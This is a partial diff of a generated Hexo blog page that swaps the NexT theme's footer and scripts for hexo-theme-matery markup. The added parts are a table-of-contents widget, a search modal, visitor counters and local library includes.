+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fa fa-list"></i>
+    </a>
+</div>
 
 
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            // headingsOffset: -205,
+            headingSelector: 'h2, h3, h4'
+        });
 
-  <span class="post-meta-divider">|</span>
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
 
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
 
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Gemini</a> v5.1.4</div>
-
-
-
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
 
         
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
 
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
 
-
-
-
-
-
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).slideUp(500);
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).slideDown(500);
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
         
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
-        
-      </div>
-    
-
-    
-
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
+    });
 </script>
+    
 
+</main>
 
 
+<footer class="page-footer bg-color">
+    <div class="container row center-align">
+        <div class="col s12 m8 l8 copy-right">
+            本站由&copy;<a href="https://blinkfox.github.io/" target="_blank">Blinkfox</a>基于
+            <a href="https://hexo.io/" target="_blank">Hexo</a> 的
+            <a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">hexo-theme-matery</a>主题搭建.
 
+            
 
+            
+			
+                <br>
+                
+                <span id="busuanzi_container_site_pv">
+                    <i class="fa fa-heart-o"></i>
+                    本站总访问量 <span id="busuanzi_value_site_pv" class="white-color"></span>
+                </span>
+                
+                
+                <span id="busuanzi_container_site_uv">
+                    <i class="fa fa-users"></i>
+                    次,&nbsp;访客数 <span id="busuanzi_value_site_uv" class="white-color"></span> 人.
+                </span>
+                
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
 
 
+    <a href="mailto:xxx@xx.xx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fa fa-envelope-open"></i>
+    </a>
 
 
-  
 
+    <a href="tencent://AddContact/?fromId=50&fromSubId=1&subcmd=all&uin=123123123" class="tooltipped" data-tooltip="QQ联系我: 123123123" data-position="top" data-delay="50">
+        <i class="fa fa-qq"></i>
+    </a>
 
-  
 
+</div>
+    </div>
+</footer>
 
+<div class="progress-bar"></div>
 
 
+<!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fa fa-search"></i>&nbsp;&nbsp;Search</span>
+            <input type="search" id="searchInput" name="s" placeholder="Please enter a search keyword"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
 
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc("/" + "search.xml", 'searchInput', 'searchResult');
+});
+</script>
+<!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fa fa-angle-up"></i>
+    </a>
+</div>
 
 
+<script src="/libs/materialize/materialize.min.js"></script>
+<script src="/libs/masonry/masonry.pkgd.min.js"></script>
+<script src="/libs/aos/aos.js"></script>
+<script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+<script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+<script src="/js/matery.js"></script>
 
+<!-- Global site tag (gtag.js) - Google Analytics -->
 
 
 
-  
-  
-    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
-  
+    <script src="/libs/others/clicklove.js"></script>
 
-  
-  
-    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
-  
 
-  
-  
-    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
-  
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
 
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
-
-  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
-
-
-
-  
-  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
-<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
-
-
-
-  
-
-
-  
-
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
 
 </body>
 </html>
